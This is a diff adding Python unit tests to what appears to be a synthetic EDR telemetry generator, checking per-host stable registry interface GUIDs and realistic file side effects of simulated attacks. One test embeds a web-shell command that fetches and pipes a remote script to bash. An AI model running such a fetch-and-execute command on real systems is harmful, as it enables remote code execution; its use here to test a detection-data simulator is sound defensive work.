@@ -218,6 +218,63 @@ class TestTemplateMaterialization:
 
         assert value == "10.10.2.20"
 
+    def test_materializes_interface_guid_stably_per_host_ip(self):
+        import random
+
+        template = r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{{{guid}}}"
+        first = materialize_edr_template(
+            template,
+            random.Random(1),
+            host_ip="10.10.2.20",
+            host_key="FILE-SRV-01",
+        )
+        second = materialize_edr_template(
+            template,
+            random.Random(999),
+            host_ip="10.10.2.20",
+            host_key="FILE-SRV-01",
+        )
+        other = materialize_edr_template(
+            template,
+            random.Random(1),
+            host_ip="10.10.2.10",
+            host_key="DC-01",
+        )
+
+        assert first == second
+        assert first != other
+
+    def test_materializes_group_interface_guid_stably_per_host_ip(self):
+        import random
+
+        templates = (
+            r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{{{guid}}}",
+            "DhcpIPAddress",
+            "{host_ip}",
+        )
+        first = materialize_edr_template_group(
+            templates,
+            random.Random(1),
+            host_ip="10.10.2.20",
+            host_key="FILE-SRV-01",
+        )
+        second = materialize_edr_template_group(
+            templates,
+            random.Random(999),
+            host_ip="10.10.2.20",
+            host_key="FILE-SRV-01",
+        )
+        other = materialize_edr_template_group(
+            templates,
+            random.Random(1),
+            host_ip="10.10.2.10",
+            host_key="DC-01",
+        )
+
+        assert first == second
+        assert first != other
+        assert first[2] == "10.10.2.20"
+
     def test_materializes_defender_platform_with_product_version_shape(self):
         import random
 
@@ -293,6 +350,20 @@ class TestFileSideEffectRealism:
         )
 
         assert effect == ("create", "/tmp/patient_claims.sql")
+
+    def test_noninteractive_web_shell_does_not_write_bash_history_artifact(self):
+        effects = {
+            select_file_side_effect(
+                "bash",
+                "bash -c 'curl http://10.0.0.5/s.sh | bash'",
+                "linux",
+                random.Random(seed),
+                user="apache",
+            )
+            for seed in range(20)
+        }
+
+        assert all(effect is None or not effect[1].endswith("/.bash_history") for effect in effects)
 
 
 class TestOverlayValidation:
